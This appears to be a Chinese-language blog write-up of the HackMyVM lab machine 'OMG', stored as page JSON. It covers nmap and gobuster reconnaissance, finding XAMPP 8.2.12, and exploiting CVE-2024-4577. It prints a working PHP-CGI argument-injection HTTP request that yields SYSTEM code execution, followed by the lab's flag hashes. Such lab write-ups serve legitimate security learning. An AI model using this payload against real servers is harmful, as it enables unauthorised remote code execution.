{"pageProps":{"postData":{"id":"HackMyVMOMG","contentHtml":"<h1>OMG.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=OMG\">https://hackmyvm.eu/machines/machine.php?vm=OMG</a></p>\n</blockquote>\n<p>Notes：<strong>Inspired by Orange Tsai.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  OMG nmap -sP 192.168.111.0/24                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 11:46 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.151\nHost is up (0.00024s latency).\nMAC Address: 00:0C:29:8F:80:E9 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.254\nHost is up (0.000074s latency).\nMAC Address: 00:50:56:E7:CE:2D (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.162\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (5 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.08 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  OMG nmap -sT -min-rate 10000 -p- 192.168.111.151\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 11:46 EDT\nWarning: 192.168.111.151 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.151\nHost is up (0.0010s latency).\nNot shown: 65090 closed tcp ports (conn-refused), 432 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n443/tcp   open  https\n445/tcp   open  microsoft-ds\n5985/tcp  open  wsman\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49671/tcp open  unknown\nMAC Address: 00:0C:29:8F:80:E9 (VMware)\n</code></pre>\n<pre><code class=\"hljs language-bash\">\t➜  OMG nmap -sT -A -T4 -O -p 80,135,139,443,445,5985 192.168.111.151                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 11:48 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.151          \nHost is up (0.00051s latency).\n                                                         \nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Apache httpd                                                                         \n|_http-server-header: Apache\n| http-title: Free Website Templates\n|_Requested resource was http://192.168.111.151/dashboard/\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n443/tcp  open  ssl/http      Apache httpd                                                                         \n| http-title: Free Website Templates                                                                              \n|_Requested resource was https://192.168.111.151/dashboard/\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47                                                                           \n|_http-server-header: Apache                       \n| tls-alpn:                                                                                                       \n|_  http/1.1                                                                                                      \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n445/tcp  open  microsoft-ds? \n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                  \n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nMAC Address: 00:0C:29:8F:80:E9 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port             \nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|2016|2022|2012|7|8.1|2019|Longhorn|Vista|2008 (97%)                 \nOS CPE: cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008:r2                                                         \nAggressive OS guesses: Microsoft Windows 10 1703 (97%), Microsoft Windows Server 2016 build 10586 - 14393 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2022 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (94%), Microsoft Windows 10 1511 (94%), Microsoft Windows Server 2012 or Server 2012 R2 (94%), Microsoft Windows Server 2019 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).                                                         \nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n                                                         \nHost script results:                                     \n|_clock-skew: 2s                                                                                                  \n| smb2-security-mode:                                                                                                                                                                                                               \n|   3:1:1:                                                                                                        \n|_    Message signing enabled but not required\n| smb2-time:                  \n|   <span class=\"hljs-built_in\">date</span>: 2025-05-15T15:48:35                            \n|_  start_date: N/A                 \n|_nbstat: NetBIOS name: WIN-H3GNRIMJQ65, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 00:0c:29:8f:80:e9 (VMware)         \n                                                         \nTRACEROUTE                          \nHOP RTT     ADDRESS                                                                                               \n1   0.51 ms 192.168.111.151                       \n</code></pre>\n<h2>Web渗透</h2>\n<h3>信息收集</h3>\n<p>访问 <code>HTTP</code> ，杀手的 <code>LOGO</code> 突脸</p>\n<p><img src=\"/post-images/HackMyVMOMG/image.png\" alt=\"image.png\"></p>\n<p>检查了一下网页貌似都是属于默认状态</p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  OMG gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.111.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -b 404,403 --no-error\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.111.151\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   301,403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.php            (Status: 302) [Size: 0] [--> http://192.168.111.151/dashboard/]\n/Index.php            (Status: 302) [Size: 0] [--> http://192.168.111.151/dashboard/]\n/examples             (Status: 503) [Size: 364]\n/INDEX.php            (Status: 302) [Size: 0] [--> http://192.168.111.151/dashboard/]\n/dashboard            (Status: 301) [Size: 306] [--> http://192.168.111.151/dashboard/]\n/IMG                  (Status: 301) [Size: 300] [--> http://192.168.111.151/IMG/]\n/xampp                (Status: 301) [Size: 302] [--> http://192.168.111.151/xampp/]\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>发现一个意想不到的目录 <code>XAMPP</code> ，<strong>XAMPP</strong>是一个把Apache网页服务器与PHP、Perl及MariaDB集合在一起的安装包，允许用户可以在自己的电脑上轻易的建立网页服务器。</p>\n<p>并且在 2024 还爆出了严重的漏洞 <strong>CVE-2024-4577</strong>：<a href=\"https://www.cnblogs.com/phpphp/p/18859709\">https://www.cnblogs.com/phpphp/p/18859709</a></p>\n<p>但是我们要知道该<code>XAMPP</code>的版本，这里我在虚拟机上装了一个 <code>XAMPP</code>，在 <code>xampp</code> 目录下有一个 <code>.version</code> 文件，里面可以查看版本号</p>\n<p><img src=\"/post-images/HackMyVMOMG/image1.png\" alt=\"image.png\"></p>\n<p>存在此文件，版本为 <code>8.2.12</code></p>\n<p><img src=\"/post-images/HackMyVMOMG/image2.png\" alt=\"image.png\"></p>\n<p>并且在影响版本中</p>\n<p><img src=\"/post-images/HackMyVMOMG/image3.png\" alt=\"image.png\"></p>\n<h3><strong>CVE-2024-4577</strong></h3>\n<p>这里使用工具：<a href=\"https://github.com/xcanwin/CVE-2024-4577-PHP-RCE\">https://github.com/xcanwin/CVE-2024-4577-PHP-RCE</a></p>\n<p>进行验证，这里包含的是 <code>C:/windows/system.ini</code></p>\n<p><img src=\"/post-images/HackMyVMOMG/image4.png\" alt=\"image.png\"></p>\n<p>成功包含，直接 <code>RCE</code></p>\n<pre><code class=\"hljs language-bash\">POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1\nHost: 192.168.111.151\nREDIRECT-STATUS: XCANWIN\n\n&#x3C;?php phpinfo();?>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMOMG/image5.png\" alt=\"image.png\"></p>\n<p>直接就是 <code>SYSTEM</code> 权限</p>\n<p><img src=\"/post-images/HackMyVMOMG/image6.png\" alt=\"image.png\"></p>\n<p>直接读取 <code>root.txt</code> 和 <code>user.txt</code></p>\n<p><img src=\"/post-images/HackMyVMOMG/image7.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">af70e9322a562983e01a250ca84fe28d\n</code></pre>\n<p><img src=\"/post-images/HackMyVMOMG/image8.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">4dcd00d9b6c66a0eae4a30aa0c781406\n</code></pre>","title":"HackMyVM - OMG","date":"2025-05-16","updated":"2025-05-16","tags":["HackMyVM","Windows靶机","XAMPP"],"categories":"靶机","comments":true},"recentPosts":[{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"},{"id":"HackTheBoxMachine - Strutted","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"06","day":"02"},{"id":"VulnyxBuild","title":"Vulnyx - Build","date":"2025-06-01","isEncrypted":false,"year":"2025","month":"06","day":"01"},{"id":"HackMyVMGalera","title":"HackMyVM - Galera","date":"2025-05-31","isEncrypted":false,"year":"2025","month":"05","day":"31"}]},"__N_SSG":true}